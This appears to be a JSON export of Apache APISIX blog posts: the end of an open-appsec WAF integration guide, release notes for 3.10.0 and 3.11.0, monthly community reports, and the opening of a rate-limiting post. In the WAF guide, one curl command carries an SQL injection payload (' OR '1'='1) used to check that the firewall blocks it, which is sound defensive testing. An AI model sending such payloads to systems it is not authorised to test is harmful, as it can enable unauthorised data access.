[here](https://docs.openappsec.io/getting-started/start-with-kubernetes/configuration-using-crds) you find all the details.\\n\\n### 6. Fetch the Target Resource Name\\n\\nFind out the name of the relevant ingress resource which you want to protect:\\n\\n```shell\\nkubectl get ing -A\\n```\\n\\n### 7. Edit the Ingress Resource\\n\\n```shell\\nkubectl edit ing/<ingress name> -n <ingress namespace>\\n```\\n\\n### 8. Change the ingressClassname\\n\\nChange the ingressClassname to use open-appsec:\\n\\n```shell\\nspec: ingressClassName: appsec-apisix\\n```\\n\\n### 9. Add Annotation to the Ingress Resource\\n\\nAdd this annotation to the ingress resource to activate open-appsec for this ingress by specifying the desired open-appsec policy custom resource.\\n\\n```shell\\nopenappsec.io/policy: open-appsec-best-practice-policy\\n```\\n\\n### 10. Validate the Standalone Configuration\\n\\nLet\'s see if the standalone configuration works by accessing it:\\n\\n```json\\ncurl -s -v -G --data-urlencode email=user@domain.abc http://[YOUR-INGRESS-HOSTNAME]\\n```\\n\\n### 11. Simulate an SQL Injection Attack\\n\\nNow let\'s try to simulate an SQL injection attack against the `httpin.org` service exposed by the APISIX gateway container which is now protected by open-appsec.\\n\\n```json\\ncurl -s -v -G --data-urlencode email=user@domain.abc\' OR \'1\'=\'1 http://[YOUR-INGRESS-HOSTNAME]\\n```\\n\\nReplace [YOUR-INGRESS-HOSTNAME] in the command above with the hostname you set in the ingress resource which you protected with open-appsec WAF in the earlier steps, also change \\"http\\" to \\"https\\" if required.\\n\\n**Congratulations!** You successfully deployed APISIX integrated with open-appsec WAF and verified that your web services exposed by the APISIX Gateway are now protected against attacks.\\n\\n## How to Manage Your open-appsec WAF Deployment Centrally?\\n\\nIf you like you can also manage your open-appsec WAF deployment (integrated with APISIX) centrally using the open-appsec Web UI (SaaS Service) available at [https://my.openappsec.io](https://my.openappsec.io), by connecting the open-appsec agent to a deployment profile in the central Web UI.\\n\\nYou can alternatively continue to manage your deployment locally but still connect to a central WebUI profile in \\"Declarative mode\\" so that you will be able to see the local configuration (read-only) in the Web UI.\\n\\nAlongside the configuration of open-appsec the Web UI allows you to also see much more information like the status of deployed open-appsec agents, security logs, dashboards and more.\\n\\nFor instructions on how to connect your deployment to the central Web UI see the open-appsec docs available at [https://docs.openappsec.io](https://docs.openappsec.io).\\n\\nBelow you find some screenshots of the Web UI.\\n\\n![Open-websec UI 1](https://static.apiseven.com/uploads/2024/10/11/MzsUwqh3_open-appsec-4.jpeg)\\n\\n![Open-websec UI 2](https://static.apiseven.com/uploads/2024/10/11/YFofdEzT_open-appsec-5.jpeg)\\n\\n## Summary\\n\\nIn this blog we explained how open-appsec can integrate with Apache APISIX on all of the following: regular Linux-based deployments, containerized deployments (Docker), and also Kubernetes environments.\\n\\nFollowing the deployment steps for APISIX with open-appsec WAF, we simulated SQL injection attacks, which were effectively prevented by open-appsec\'s machine learning-based WAF technology.\\n\\nAdditionally, it was explained, what the benefits are of connecting to open-appsec central WebUI for managing, monitoring, log analysis, and reporting.\\n\\nWe hope these new integrations will prove very useful to enhance the security of your APISIX API gateway and its exposed web APIs and web applications with open-appsec machine learning-based WAF.\\n\\nWelcome you to contact us if you have any feedback, or questions or might face some technical challenge that you want us to assist with. You can reach the open-appsec team via the chat on [https://www.openappsec.io](https://www.openappsec.io) or via email to: [info@openappsec.io](info@openappsec.io).\\n\\n## Additional Resources\\n\\n### open-appsec WAF\\n\\nWebsite: https://www.openappsec.io\\n\\nGitHub: https://github.com/openappsec\\n\\nDocs: https://docs.openappsec.io\\n\\nPlaygrounds: https://www.openappsec.io/playground\\n\\nBlogs: https://www.openappsec.io/blogs\\n\\n### Apache APISIX\\n\\nWebsite: https://apisix.apache.org\\n\\nGitHub: https://github.com/apache/apisix\\n\\nDocs: https://apisix.apache.org/docs/\\n\\nBlogs: https://apisix.apache.org/blog/"},{"id":"Release Apache APISIX 3.11.0","metadata":{"permalink":"/blog/2024/10/17/release-apache-apisix-3.11.0","source":"@site/blog/2024/10/17/release-apache-apisix-3.11.0.md","title":"Release Apache APISIX 3.11.0","description":"The Apache APISIX 3.11.0 version is released on October 17, 2024. This release includes a few changes, new features, bug fixes, and other improvements to user experiences.","date":"2024-10-17T00:00:00.000Z","formattedDate":"October 17, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.505,"truncated":true,"authors":[{"name":"Abhishek Choudhary","title":"Author","url":"https://github.com/shreemaan-abhishek","image_url":"https://github.com/shreemaan-abhishek.png","imageURL":"https://github.com/shreemaan-abhishek.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Announcing Integration between Apache APISIX and open-appsec WAF","permalink":"/blog/2024/10/22/apisix-integrates-with-open-appsec"},"nextItem":{"title":"Monthly Report (September 01 - September 30)","permalink":"/blog/2024/09/30/monthly-report"}},"content":"We are glad to present Apache APISIX 3.11.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the addition of AI plugins to integrate with LLM providers, the support for AWS and GCP Secret Managers for secret management, and more.\\n\\nThere are a few breaking changes included in this release. Should you find these changes impacting your operations, please plan accordingly for a seamless upgrade.\\n\\n## Breaking Changes\\n\\n### Remove JWT signing endpoint and private key configuration\\n\\nRemove the `/apisix/plugin/jwt/sign` JWT signing endpoint previously added by the `jwt-auth` plugin for enhanced security. The plugin now does not require users to upload private keys for issuing JWTs. Please sign JWT with other utilities.\\n\\nFor more details, see [PR #11597](https://github.com/apache/apisix/pull/11597).\\n\\n### Refactor `hmac-auth` plugin per RFC\\n\\nThe plugin implementation is now based on [draft-cavage-http-signatures](https://www.ietf.org/archive/id/draft-cavage-http-signatures-12.txt) and the configurable parameters have changed.\\n\\nFor more details, see the latest [plugin doc](https://apisix.apache.org/docs/apisix/plugins/hmac-auth/) and [PR #11581](https://github.com/apache/apisix/pull/11581)\\n\\n## New Features\\n\\n### Add Consumer credentials resource and introduce consumer identifiable headers\\n\\nAdd the credential resource to store authentication configurations associated with consumers. A consumer can be associated with one or more credentials from a designated list of authentication plugins, including `key-auth`, `basic-auth`, `jwt-auth`, and `hmac-auth`. The decoupling of credentials facilitates credential reuse and rotation as well as enhanced security.\\n\\nFor instance, suppose you have a consumer `tom`:\\n\\n```shell\\ncurl -i \\"http://127.0.0.1:9180/apisix/admin/consumers\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"username\\": \\"tom\\"\\n  }\'\\n```\\n\\nTo configure the consumer `key-auth` credential for `tom`, you can use the credential object:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/consumers/tom/credentials\\" -X PUT \\\\\\n  -H \\"X-API-KEY: ${ADMIN_API_KEY}\\" \\\\\\n  -d \'{\\n    \\"id\\": \\"cred-tom-key-auth\\",\\n    \\"plugins\\": {\\n      \\"key-auth\\": {\\n        \\"key\\": \\"secret-key\\"\\n      }\\n    }\\n  }\'\\n```\\n\\nThis feature does not introduce any breaking change. You may still configure the authentication plugin and their credential on consumer.\\n\\nAdditionally, APISIX will add additional headers, including `X-Consumer-Username`, `X-Credential-Identifier`, and optionally, `X-Consumer-Custom-ID` if configured, to the authenticated requests.\\n\\nFor more information, see the [credential doc](https://apisix.apache.org/docs/apisix/next/terminology/credential/) and [PR #11601](https://github.com/apache/apisix/pull/11601).\\n\\n### Add new plugin `attach-consmer-label`\\n\\nThe new `attach-consumer-label` plugin attaches custom consumer-related labels, in addition to `X-Consumer-Username` and `X-Credential-Indentifier`, to authenticated requests, for upstream services to differentiate between consumers and implement additional logics.\\n\\nFor more information, see the [plugin doc](https://apisix.apache.org/docs/apisix/next/plugins/attach-consumer-label/) and [PR #11604](https://github.com/apache/apisix/pull/11604).\\n\\n### Add new plugin `ai-proxy`\\n\\nThe new `ai-proxy` plugin simplifies access to LLM providers and models by transforming plugin configurations into the designated request format.\\n\\nThe plugin currently only supports transforming plugin configurations to the request format required by OpenAI and contributions are welcomed.\\n\\nFor more information, see the [plugin doc](https://apisix.apache.org/docs/apisix/next/plugins/ai-proxy/) and [PR #11499](https://github.com/apache/apisix/pull/11604).\\n\\n### Add new plugin `ai-prompt-decorator`\\n\\nThe `ai-prompt-template` plugin supports the pre-configurations of prompt templates that only accept user inputs in designated template variables, in a \\"fill in the blank\\" fashion. The plugin is used when proxying to LLM services.\\n\\nFor more information, see the [plugin doc](https://apisix.apache.org/docs/apisix/next/plugins/ai-prompt-decorator/) and [PR #11515](https://github.com/apache/apisix/pull/11515).\\n\\n### Add new plugin `ai-prompt-template`\\n\\nThe `ai-prompt-decorator` plugin decorates user input prompts by prefixing and appending pre-engineered prompts, to provide pre-set contexts in content generation. The practice helps shape how the model should operate within desired guidelines during the interactions. The plugin is used when proxying to LLM services.\\n\\nFor more information, see the [plugin doc](https://apisix.apache.org/docs/apisix/next/plugins/ai-prompt-template/) and [PR #11517](https://github.com/apache/apisix/pull/11517).\\n\\n### Support customizing keepalive timeout in `splunk-logger` plugin\\n\\nSupport the configuration of keepalive timeout in `splunk-logger` plugin parameter to avoid sockets left open in high scale. If unconfigured, the default keepalive timeout will be 60000 milliseconds.\\n\\nFor more information, see [PR #11611](https://github.com/apache/apisix/pull/11611).\\n\\n### Support AWS and GCP secret managers\\n\\nSupport the integration with [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/) and [GCP Secret Manager](https://cloud.google.com/security/products/secret-manager?hl=en) for secrets management.\\n\\nFor more information on the support for AWS Secrets Manager, see [use AWS Secrets Manager to manage secrets](https://apisix.apache.org/docs/apisix/next/terminology/secret/#use-aws-secrets-manager-to-manage-secrets) and [PR #11417](https://github.com/apache/apisix/pull/11417).\\n\\nFor more information on the support for GCP Secret Manager, see [use GCP Secret Manager to manage secrets](https://apisix.apache.org/docs/apisix/next/terminology/secret/#use-gcp-secrets-manager-to-manage-secrets) and [PR #11436](https://github.com/apache/apisix/pull/11436).\\n\\n## Other Updates\\n\\n- Correct the position of enums in `pb_option_def` of the `grpc-transcode` plugin ([PR #11448](https://github.com/apache/apisix/pull/11448))\\n- Fix encryption/decryption errors when non-auth plugins are configured on consumers ([PR #11600](https://github.com/apache/apisix/pull/11600))\\n- Fix issues when substituting environment variables in config file ([PR #11545](https://github.com/apache/apisix/pull/11545))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#3110)."},{"id":"Monthly Report (September 01 - September 30)","metadata":{"permalink":"/blog/2024/09/30/monthly-report","source":"@site/blog/2024/09/30/monthly-report.md","title":"Monthly Report (September 01 - September 30)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-09-30T00:00:00.000Z","formattedDate":"September 30, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2,"truncated":true,"authors":[],"prevItem":{"title":"Release Apache APISIX 3.11.0","permalink":"/blog/2024/10/17/release-apache-apisix-3.11.0"},"nextItem":{"title":"Monthly Report (August 01 - August 31)","permalink":"/blog/2024/08/31/monthly-report"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The main improvements include the addition of `attach-consumer-label`, `ai-prompt-decorator`, and `ai-proxy` plugins, as well as support for GCP Secret Manager, among other enhancements. For detailed information, please read the monthly report.\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom September 1 to September 30, 10 contributors made 21 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/09/30/LeOeANHk_Group%20427319848.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/09/30/BjHKV34C_sep-new-contributors.png)\\n\\n## Recent Feature Highlights\\n\\n1. [Add `attach-consumer-label` Plugin](https://github.com/apache/apisix/pull/11604)\uff08Contributor: [dspo](https://github.com/dspo))\\n\\nThe `attach-consumer-label` plugin attaches custom consumer-related labels for upstream services to differentiate between consumers and implement additional logic.\\n\\n2. [Add `ai-prompt-decorator` Plugin](https://github.com/apache/apisix/pull/11515)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nThe `ai-prompt-decorator` plugin simplifies access to LLM providers, such as OpenAI and Anthropic, and their models by appending or prepending prompts into the request.\\n\\n3. [Add `ai-proxy` Plugin](https://github.com/apache/apisix/pull/11499)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\nThe `ai-proxy` plugin simplifies access to LLM providers and models by defining a standard request format that allows key fields in plugin configuration to be embedded into the request.\\n\\n4. [Add Support of GCP Secret Manager](https://github.com/apache/apisix/pull/11436)\uff08Contributor: [HuanXin-Chen](https://github.com/HuanXin-Chen))\\n\\nThis PR added the `gcp.lua` file to the original secret module, allowing users to store their secret information on GCP using the same reference method as before.\\n\\n5. [Add credential and Related Admin APIs](https://github.com/apache/apisix/pull/11601)\uff08Contributor: [dspo](https://github.com/dspo))\\n\\nCredential is an entity used to store authentication configurations associated with consumers. A consumer can be associated with one or more credentials from a list of authentication plugins, including `basic-auth`, `hmac-auth`, `jwt-auth`, and `key-auth`.\\n\\n6. [Refactor hmac-auth Plugin](https://github.com/apache/apisix/pull/11581)\uff08Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\nThis PR refactors the HMAC authentication plugin to improve its usability and compliance with RFC standards.\\n\\n7. [Remove JWT Token Issuing](https://github.com/apache/apisix/pull/11597)\uff08Contributor: [dspo](https://github.com/dspo))\\n\\nRemoving the capability for the API gateway to issue JWT tokens enhances security by centralizing token management within dedicated authentication servers.\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Monthly Report (August 01 - August 31)","metadata":{"permalink":"/blog/2024/08/31/monthly-report","source":"@site/blog/2024/08/31/monthly-report.md","title":"Monthly Report (August 01 - August 31)","description":"Our monthly Apache APISIX community report generates insights into the project\'s monthly developments. The reports provide a pathway into the Apache APISIX community, ensuring that you stay well-informed and actively involved.","date":"2024-08-31T00:00:00.000Z","formattedDate":"August 31, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.455,"truncated":true,"authors":[],"prevItem":{"title":"Monthly Report (September 01 - September 30)","permalink":"/blog/2024/09/30/monthly-report"},"nextItem":{"title":"Release Apache APISIX 3.10.0","permalink":"/blog/2024/08/14/release-apache-apisix-3.10.0"}},"content":"> We have recently made some additions and improvements to specific features within Apache APISIX. The main improvements include adding ai-prompt-template plugin and supporting AWS Secrets Manager. For detailed information, please read the monthly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nFrom its inception, the Apache APISIX project has embraced the ethos of open-source community collaboration, propelling it into the ranks of the most active global open-source API gateway projects. The proverbial wisdom of \'teamwork makes the dream work\' rings true in our way and is made possible by the collective effort of our community.\\n\\nFrom August 1 to August 31, a total of 16 contributors made 25 commits to Apache APISIX. We sincerely appreciate your contributions to Apache APISIX.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2024/08/30/rjB3aezA_aug-cntributors.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2024/08/30/CxoRAI3y_aug-new-contributors.png)\\n\\n## Recent Feature Highlight\\n\\n- [Add ai-prompt-template Plugin](https://github.com/apache/apisix/pull/11517)\uff08Contributor: [shreemaan-abhishek](https://github.com/shreemaan-abhishek))\\n\\n- [Support AWS Secrets Manager](https://github.com/apache/apisix/pull/11417)\uff08Contributor: [HuanXin-Chen](https://github.com/HuanXin-Chen))\\n\\n## Recent Blog Recommendations\\n\\n- [Differentiating rate limits in Apache APISIX](https://apisix.apache.org/blog/2024/07/25/different-rate-limits-apisix/)\\n\\n  This post examines the implementation of rate limiting using Apache APISIX. The rate limit is first applied to a specific route, then transitioned to individual consumers, and finally to consumer groups, allowing all members of a group to share a common \\"pool.\\"\\n  \\n- [Free tier API with Apache APISIX](https://apisix.apache.org/blog/2024/08/01/free-tier-api-apisix/)\\n\\n  In this day and age, most services are online and accessible via an API. A free tier is a must for any API service provider worth its salt. In this blog, a free tier with Apache APISIX is implemented.\\n\\nThe [official website](https://apisix.apache.org/) and [GitHub Issues](https://github.com/apache/apisix/issues) of Apache APISIX provide a wealth of documentation of tutorials and real-world use cases. If you encounter any issues, you can refer to the documentation, search for keywords in Issues, or participate in discussions on Issues to share your ideas and practical experiences."},{"id":"Release Apache APISIX 3.10.0","metadata":{"permalink":"/blog/2024/08/14/release-apache-apisix-3.10.0","source":"@site/blog/2024/08/14/release-apache-apisix-3.10.0.md","title":"Release Apache APISIX 3.10.0","description":"The Apache APISIX 3.10.0 version is released on August 14, 2024. This release includes a few changes, new features, bug fixes, and other improvements to user experiences.","date":"2024-08-14T00:00:00.000Z","formattedDate":"August 14, 2024","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":4.91,"truncated":true,"authors":[{"name":"Abhishek Choudhary","title":"Author","url":"https://github.com/shreemaan-abhishek","image_url":"https://github.com/shreemaan-abhishek.png","imageURL":"https://github.com/shreemaan-abhishek.png"},{"name":"Traky Deng","title":"Technical Writer","url":"https://github.com/kayx23","image_url":"https://github.com/kayx23.png","imageURL":"https://github.com/kayx23.png"}],"prevItem":{"title":"Monthly Report (August 01 - August 31)","permalink":"/blog/2024/08/31/monthly-report"},"nextItem":{"title":"Free tier API with Apache APISIX","permalink":"/blog/2024/08/01/free-tier-api-apisix"}},"content":"We are glad to present Apache APISIX 3.10.0 with exciting new features, bug fixes, and other improvements to user experiences.\\n\\n\x3c!--truncate--\x3e\\n\\nThis new release adds a number of new features, including the support for add-on headers in the `openid-connect` plugin, storing SSL certs and keys in secrets manager, autogeneration of Admin API key, and more.\\n\\nThere are a few important changes included in this release. Should you find these changes impacting your operations, please plan accordingly for a seamless upgrade.\\n\\n## Breaking Changes\\n\\n### Autogenerate Admin API key if not configured\\n\\nThe default Admin API key `edd1c9f034335f136f87ad84b625c8f1` is now removed. If no custom Admin API key is configured in `config.yaml`, APISIX will autogenerate an Admin API key.\\n\\nFor more details, see [PR #11080](https://github.com/apache/apisix/pull/11080).\\n\\n### Enable data encryption by default\\n\\nThe `data_encryption.enable_encrypt_fields` option, previously defaults to `false`, now defaults to `true` to enhance data security. This means that by default, sensitive plugin fields (defined in the `encrypt_fields` attribute of plugin schema) and TLS certificate private key are now encrypted.\\n\\nThe configuration only applies when the configuration center is etcd. Encryption does not take place when the configuration center is YAML (i.e. standalone mode) to avoid unexpected failures.\\n\\nFor more details, see [PR #11076](https://github.com/apache/apisix/pull/11076).\\n\\n### Categorize more sensitive plugin fields for encryption\\n\\nCategorize more sensitive plugin data fields under the `encrypt_fields` attributes, which should be encrypted when `data_encryption.enable_encrypt_fields` option is set to `true`.\\n\\nFor more information, see [PR #11095](https://github.com/apache/apisix/pull/11095).\\n\\n### Introduce max request and response body sizes to `kafka-logger` plugin\\n\\nIntroduce maximum request and response body size attributes `max_req_body_bytes` and `max_resp_body_bytes` to the `kafka-logger` plugin. The default values are set to 524288 bytes, or 512 KiB.\\n\\nThis helps mitigates the situation when `include_req_body` or `include_resp_body` is enabled and the request or response body is very large, leading to high CPU usage.\\n\\nFor more details, see [PR #11133](https://github.com/apache/apisix/pull/11133).\\n\\n### Remove `core.grpc` module\\n\\nAs the `core.grpc` module is observed to be unstable in production and APISIX no longer depends on it, this release removes the module.\\n\\nFor users that depend on the gRPC module for custom functionalities, please plan accordingly.\\n\\nFor more details, see [proposal](https://lists.apache.org/thread/05xvcbvty1txr1owx61vyktsmgs2pdd5) and [PR #11427](https://github.com/apache/apisix/pull/11427).\\n\\n## New Features\\n\\n### Support add-on headers in the `openid-connect` plugin\\n\\nYou can now append additional header values to the introspection request in the `introspection_addon_headers` field when working with the `openid-connect` plugin.\\n\\nFor more information, see [PR #11090](https://github.com/apache/apisix/pull/11090).\\n\\n### Print warning message in log when requesting external services without TLS\\n\\nIf you request external services without TLS, for example, using the `authz-casdoor` plugin, you should now see warning messages similar to the following in the error log:\\n\\n```text\\nUsing authz-casdoor endpoint_addr with no TLS is a security risk\\nUsing authz-casdoor callback_url with no TLS is a security risk\\n```\\n\\nFor more information, see [PR #11403](https://github.com/apache/apisix/pull/11403).\\n\\n### Support storing SSL certs and keys in secrets manager\\n\\nSupport storing certificates `certs` and private keys `keys` on SSL resource in secrets manager. In the earlier releases, only `cert` and `key` support secrets manager.\\n\\nYou can now configure a SSL resource such as the following:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/ssls\\" -X PUT -d \'\\n{\\n  \\"id\\": \\"sample-ssl\\",\\n  \\"sni\\": \\"test.com\\",\\n  \\"cert\\": \\"$secret://vault/test/ssl/test.com.crt\\",\\n  \\"key\\": \\"$secret://vault/test/ssl/test.com.key\\",\\n  \\"certs\\": [\\"$secret://vault/test/ssl/test.com.crt\\"],\\n  \\"keys\\": [\\"$secret://vault/test/ssl/test.com.key\\"]\\n}\'\\n```\\n\\nFor more information, see [PR #11339](https://github.com/apache/apisix/pull/11339).\\n\\n### Support HashiCorp Vault namespace\\n\\nSupport specifying HashiCorp Vault namespace in SSL resource, for example:\\n\\n```shell\\ncurl \\"http://127.0.0.1:9180/apisix/admin/ssls\\" -X PUT -d \'\\n{\\n  \\"id\\": \\"sample-ssl\\",\\n  \\"sni\\": \\"test.com\\",\\n  \\"certs\\": \\"$secret://vault/test/ssl/test.com.crt\\",\\n  \\"keys\\": \\"$secret://vault/test/ssl/test.com.key\\"],\\n  \\"namespace\\": \\"apisix\\"\\n}\'\\n```\\n\\nFor more information, see [PR #11277](https://github.com/apache/apisix/pull/11277).\\n\\n### List K8s cluster endpoints in Control API discovery memory dump\\n\\nThe Control API `/v1/discovery/kubernetes/dump` endpoint now lists K8s cluster endpoints. For example:\\n\\n```shell\\ncurl http://127.0.0.1:9090/v1/discovery/kubernetes/dump | jq\\n```\\n\\nYou will see the cluster endpoints:\\n\\n```json\\n{\\n  \\"endpoints\\": [\\n    {\\n      \\"endpoints\\": [\\n        {\\n          \\"value\\": \\"{\\\\\\"https\\\\\\":[{\\\\\\"host\\\\\\":\\\\\\"172.18.164.170\\\\\\",\\\\\\"port\\\\\\":6443,\\\\\\"weight\\\\\\":50},{\\\\\\"host\\\\\\":\\\\\\"172.18.164.171\\\\\\",\\\\\\"port\\\\\\":6443,\\\\\\"weight\\\\\\":50},{\\\\\\"host\\\\\\":\\\\\\"172.18.164.172\\\\\\",\\\\\\"port\\\\\\":6443,\\\\\\"weight\\\\\\":50}]}\\",\\n          \\"name\\": \\"default/kubernetes\\"\\n        },\\n        {\\n          \\"value\\": \\"{\\\\\\"metrics\\\\\\":[{\\\\\\"host\\\\\\":\\\\\\"172.18.164.170\\\\\\",\\\\\\"port\\\\\\":2379,\\\\\\"weight\\\\\\":50},{\\\\\\"host\\\\\\":\\\\\\"172.18.164.171\\\\\\",\\\\\\"port\\\\\\":2379,\\\\\\"weight\\\\\\":50},{\\\\\\"host\\\\\\":\\\\\\"172.18.164.172\\\\\\",\\\\\\"port\\\\\\":2379,\\\\\\"weight\\\\\\":50}]}\\",\\n          \\"name\\": \\"kube-system/etcd\\"\\n        },\\n        {\\n          \\"value\\": \\"{\\\\\\"http-85\\\\\\":[{\\\\\\"host\\\\\\":\\\\\\"172.64.89.2\\\\\\",\\\\\\"port\\\\\\":85,\\\\\\"weight\\\\\\":50}]}\\",\\n          \\"name\\": \\"test-ws/testing\\"\\n        }\\n      ],\\n      \\"id\\": \\"first\\"\\n    }\\n  ],\\n  \\"config\\": [\\n    {\\n      \\"default_weight\\": 50,\\n      \\"id\\": \\"first\\",\\n      \\"client\\": {\\n        \\"token\\": \\"xxx\\"\\n      },\\n      \\"service\\": {\\n        \\"host\\": \\"172.18.164.170\\",\\n        \\"port\\": \\"6443\\",\\n        \\"schema\\": \\"https\\"\\n      },\\n      \\"shared_size\\": \\"1m\\"\\n    }\\n  ]\\n}\\n```\\n\\nFor more information, see [PR #11111](https://github.com/apache/apisix/pull/11111).\\n\\n## Other Updates\\n\\n- Use LRU cache in secret fetching to improve performance ([PR #11201](https://github.com/apache/apisix/pull/11201))\\n- Move default configurations in `config-default.yaml` to a hardcoded Lua file ([PR #11343](https://github.com/apache/apisix/pull/11343))\\n- Fix etcd sync data checker ([PR #11457](https://github.com/apache/apisix/pull/11457))\\n- Add plugin metadata ID to avoid the etcd checker failure ([PR #11452](https://github.com/apache/apisix/pull/11452))\\n- Allow trailing period in SNI and CN for SSL ([PR #11414](https://github.com/apache/apisix/pull/11414))\\n- Upgrade `lua-protobuf` dependency version to filter out illegal `INT(string)` formats in the `grpc-transcode` plugin ([PR #11367](https://github.com/apache/apisix/pull/11367))\\n- Rectify the error message when API key is missing ([PR #11370](https://github.com/apache/apisix/pull/11370))\\n- Fix the failure of reporting consumer username tag using the `datadog` plugin ([PR #11354](https://github.com/apache/apisix/pull/11354))\\n- Fix request error caused by SSL key rotation ([PR #11305](https://github.com/apache/apisix/pull/11305))\\n- Ensure that all etcd events are handled properly ([PR #11268](https://github.com/apache/apisix/pull/11268))\\n- Fix stream route matcher being `nil` after the first match ([PR #11269](https://github.com/apache/apisix/pull/11269))\\n- Rectify the way to fetch secret resource by ID ([PR #11164](https://github.com/apache/apisix/pull/11164))\\n- Fix the 500 error thrown when using the default configuration in the `multi-auth` plugin ([PR #11145](https://github.com/apache/apisix/pull/11145))\\n- Avoid overwriting the `Access-Control-Expose-Headers` response header in the `cors` plugin ([PR #11136](https://github.com/apache/apisix/pull/11136))\\n- Close session in case of error to avoid blocked session ([PR #11089](https://github.com/apache/apisix/pull/11089))\\n- Restore pb state before other operations in the kafka pubsub module ([PR #11135](https://github.com/apache/apisix/pull/11135))\\n- Add a default limit of 100 for request headers to limit security risks ([PR #11140](https://github.com/apache/apisix/pull/11140))\\n- Allow disabling prometheus metric export server when `prometheus` plugin is turned off ([PR #11117](https://github.com/apache/apisix/pull/11117))\\n- Add POST request headers only if the `request_method` is set to POST in the `forward-auth` plugin ([PR #11021](https://github.com/apache/apisix/pull/11021))\\n- Fix the 500 error in the `hmac-auth` plugin when using duplicate signature header ([PR #11127](https://github.com/apache/apisix/pull/11127))\\n- Fix brotli partial response ([PR #11087](https://github.com/apache/apisix/pull/11087))\\n- Update the upstream schema to disallow port value greater than 65535 ([PR #11043](https://github.com/apache/apisix/pull/11043))\\n\\n## Changelog\\n\\nFor a complete list of changes in this release, please see [CHANGELOG](https://github.com/apache/apisix/blob/master/CHANGELOG.md#3100)."},{"id":"Free tier API with Apache APISIX","metadata":{"permalink":"/blog/2024/08/01/free-tier-api-apisix","source":"@site/blog/2024/08/01/free-tier-api-apisix.md","title":"Free tier API with Apache APISIX","description":"Lots of service providers offer a free tier of their service. The idea is to let you kick their service\'s tires freely. If you need to go above the free tier at any point, you\'ll likely stay on the service and pay. In this day and age, most services are online and accessible via an API. Today, we will implement a free tier with Apache APISIX.\\n","date":"2024-08-01T00:00:00.000Z","formattedDate":"August 1, 2024","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4.145,"truncated":true,"authors":[{"name":"Nicolas Fr\xe4nkel","title":"Author","url":"https://github.com/nfrankel","image_url":"https://avatars.githubusercontent.com/u/752258","imageURL":"https://avatars.githubusercontent.com/u/752258"}],"prevItem":{"title":"Release Apache APISIX 3.10.0","permalink":"/blog/2024/08/14/release-apache-apisix-3.10.0"},"nextItem":{"title":"Monthly Report (July 01 - July 31)","permalink":"/blog/2024/07/31/monthly-report"}},"content":"<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.frankel.ch/free-tier-api-apisix/\\" />\\n</head>\\n\\n>Lots of service providers offer a free tier of their service. The idea is to let you kick their service\'s tires freely. If you need to go above the free tier at any point, you\'ll likely stay on the service and pay. In this day and age, most services are online and accessible via an API. Today, we will implement a free tier with [Apache APISIX](https://apisix.apache.org/).\\n\\n\x3c!--truncate--\x3e\\n\\n## A naive approach\\n\\nI implemented a free tier in my post [Evolving your RESTful APIs, a step-by-step approach](https://blog.frankel.ch/evolve-apis/#know-your-users), albeit in a very naive way. I copy-pasted the [limit-count](https://apisix.apache.org/docs/apisix/plugins/limit-count/) plugin and added my required logic.\\n\\n```lua\\nfunction _M.access(conf, ctx)\\n    core.log.info(\\"ver: \\", ctx.conf_version)\\n\\n    -- no limit if the request is authenticated\\n    local key = core.request.header(ctx, conf.header)                               #1\\n    if key then\\n        local consumer_conf = consumer_mod.plugin(\\"key-auth\\")                       #2\\n        if consumer_conf then\\n            local consumers = lrucache(\\"consumers_key\\", consumer_conf.conf_version, #3\\n                    create_consume_cache, consumer_conf)\\n            local consumer = consumers[key]                                         #4\\n            if consumer then                                                        #5\\n                return\\n            end\\n        end\\n    end\\n-- rest of the logic\\n```\\n\\n1. Get the configured request header value\\n2. Get the consumer\'s `key-auth` configuration\\n3. Get consumers\\n4. Get the consumer with the passed API key if they exist\\n5. If they exist, bypass the rate limiting logic\\n\\nThe downside of this approach is that the code is now my own. It has evolved since I copied it, and I\'m stuck with the version I copied. We can do better, with the help of the `vars` parameter on routes.\\n\\n## APISIX route 